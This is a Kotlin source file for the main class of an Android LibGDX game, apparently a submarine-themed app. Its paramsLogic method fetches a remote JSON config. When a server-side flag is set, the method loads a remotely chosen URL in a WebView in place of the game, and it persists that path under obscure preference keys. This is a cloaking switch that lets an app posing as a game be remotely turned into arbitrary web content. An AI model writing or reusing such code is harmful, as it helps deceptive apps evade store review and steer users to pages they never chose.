package com.plinkray.ioosudmarine.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.plinkray.ioosudmarine.MainActivity
import com.plinkray.ioosudmarine.appContext
import com.plinkray.ioosudmarine.game.dataStore.DS_Balance
import com.plinkray.ioosudmarine.game.manager.MusicManager
import com.plinkray.ioosudmarine.game.manager.NavigationManager
import com.plinkray.ioosudmarine.game.manager.SoundManager
import com.plinkray.ioosudmarine.game.manager.SpriteManager
import com.plinkray.ioosudmarine.game.manager.util.MusicUtil
import com.plinkray.ioosudmarine.game.manager.util.SoundUtil
import com.plinkray.ioosudmarine.game.manager.util.SpriteUtil
import com.plinkray.ioosudmarine.game.screens.LoaderScreen
import com.plinkray.ioosudmarine.game.utils.GameColor
import com.plinkray.ioosudmarine.game.utils.advanced.AdvancedGame
import com.plinkray.ioosudmarine.game.utils.disposeAll
import com.plinkray.ioosudmarine.util.Gist
import com.plinkray.ioosudmarine.util.log
import kotlinx.coroutines.*

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false

var GDX_ORIGINAL_LINK = ""
    private set

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Kal Amber Hurt", MODE_PRIVATE)

    val ds_Balance = DS_Balance(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        paramsLogic()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun paramsLogic() {
        log("paramsLogic")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Polinka", "Vera") ?: "Vera"

        try {
            if (path == "Vera") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag == "true") {
                            GDX_ORIGINAL_LINK = getJSON.link
                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.webViewHelper.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.webViewHelper.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

}